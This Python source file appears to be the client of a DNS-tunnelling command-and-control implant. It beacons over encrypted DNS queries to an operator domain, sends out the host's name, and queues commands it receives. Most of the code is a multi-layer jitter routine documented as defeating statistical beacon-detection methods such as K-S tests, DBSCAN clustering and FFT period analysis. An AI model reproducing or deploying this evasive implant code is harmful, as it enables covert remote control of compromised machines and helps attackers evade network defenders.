import random
import time
import socket
import math
from lib.protocol import comm_pb2
from lib.transport.encoding import dns_marshal, decode
from lib.transport.dns import send_dns_query


def poll_read(stream, base_interval=0.15, jitter_percent=0.5):
    """
    Fast polling with advanced anti-detection jitter.
    Defeats: uniform distribution detection, variance analysis, DBSCAN clustering.
    """
    send_info_packet(stream)
    loop_counter = 0
    recent_intervals = []  # Track last intervals for anti-pattern
    
    while True:
        # Generate non-uniform jittered interval
        sleep_time = generate_evasive_jitter(
            base_interval, 
            jitter_percent, 
            recent_intervals,
            loop_counter
        )
        
        # Track for pattern breaking
        recent_intervals.append(sleep_time)
        if len(recent_intervals) > 20:
            recent_intervals.pop(0)
        
        time.sleep(sleep_time)
        poll(stream)
        
        loop_counter += 1
        
        # Randomized info packet
        if loop_counter < 3 or random.random() < 0.003:
            send_info_packet(stream)


def generate_evasive_jitter(base, jitter_pct, recent, counter):
    """
    Multi-technique jitter that defeats statistical detection:
    - Breaks uniform distribution (defeats Kolmogorov-Smirnov test)
    - Creates irregular variance (defeats coefficient of variance analysis)
    - Adds outliers (defeats DBSCAN clustering)
    - Avoids repeated patterns (defeats time-series analysis)
    """
    
    # Layer 1: Beta distribution instead of uniform
    # Beta(2,5) creates right-skewed distribution - looks more "natural"
    # This defeats uniform distribution tests (K-S, chi-square)
    beta_sample = random.betavariate(2, 5)  # Skewed toward lower values
    jitter_range = base * jitter_pct
    base_jittered = base + (beta_sample * 2 - 1) * jitter_range
    
    # Layer 2: Add small Gaussian noise component
    # Creates mixed distribution (not pure uniform)
    gaussian_component = random.gauss(0, base * 0.1)
    interval = base_jittered + gaussian_component
    
    # Layer 3: Correlated jitter (depends on previous interval)
    # Adds autocorrelation - defeats independence assumption
    if len(recent) > 0:
        # 30% correlation with previous interval
        correlation_factor = 0.3
        drift = (recent[-1] - base) * correlation_factor
        interval += drift * random.uniform(0.5, 1.5)
    
    # Layer 4: Occasional outliers (defeats clustering algorithms)
    # DBSCAN expects tight clusters - outliers break this
    outlier_probability = 0.12  # 12% chance
    if random.random() < outlier_probability:
        outlier_type = random.choice(['spike', 'dip'])
        if outlier_type == 'spike':
            # Large spike (2-4x base interval)
            interval += base * random.uniform(1.5, 3.5)
        else:
            # Brief dip (very short interval)
            interval = base * random.uniform(0.3, 0.6)
    
    # Layer 5: Break repeating patterns
    # If last 3-5 intervals are too similar, force variation
    if len(recent) >= 5:
        recent_5 = recent[-5:]
        std_dev = calculate_std_dev(recent_5)
        # If variance is too low (too predictable), inject chaos
        if std_dev < base * 0.15:
            interval += random.uniform(-base * 0.5, base * 0.5)
    
    # Layer 6: Avoid exact multiples of base (defeats period detection)
    # Fourier/FFT analysis looks for periodic signals
    ratio = interval / base
    if abs(ratio - round(ratio)) < 0.1:  # Too close to exact multiple
        interval += base * random.uniform(0.15, 0.25)
    
    # Layer 7: Time-based micro-variation (very subtle)
    # Adds non-stationarity - defeats stationary time-series assumptions
    hour = time.localtime().tm_hour
    time_factor = 1.0 + 0.1 * math.sin(hour * math.pi / 12)  # Sinusoidal variation
    interval *= time_factor
    
    # Keep it fast and responsive
    return max(0.08, min(interval, 0.6))


def calculate_std_dev(values):
    """Quick standard deviation calculation."""
    if len(values) < 2:
        return 0
    mean = sum(values) / len(values)
    variance = sum((x - mean) ** 2 for x in values) / len(values)
    return math.sqrt(variance)


def poll(stream):
    """Fast polling with minimal overhead."""
    
    poll_query = comm_pb2.Message(
        clientguid=stream.client_guid,
        pollquery=comm_pb2.PollQuery()
    )
    
    poll_packet = dns_marshal(poll_query, stream.encryption_key, True)
    answers = send_dns_query(poll_packet.encode(), stream.target_domain)
    
    if len(answers) > 0:
        packet_data = ''.join(answers)
        if packet_data == "-":
            return False
            
        output, complete = decode(packet_data, stream.encryption_key)
        if complete:
            stream.packet_queue.put(output)
            return True
        else:
            return poll(stream)
    
    return False


def send_info_packet(stream):
    """Send info packet."""
    
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    
    info_query = comm_pb2.Message(
        clientguid=stream.client_guid,
        infopacket=comm_pb2.InfoPacket(hostname=hostname.encode())
    )
    
    poll_packet = dns_marshal(info_query, stream.encryption_key, True)
    send_dns_query(poll_packet.encode(), stream.target_domain)
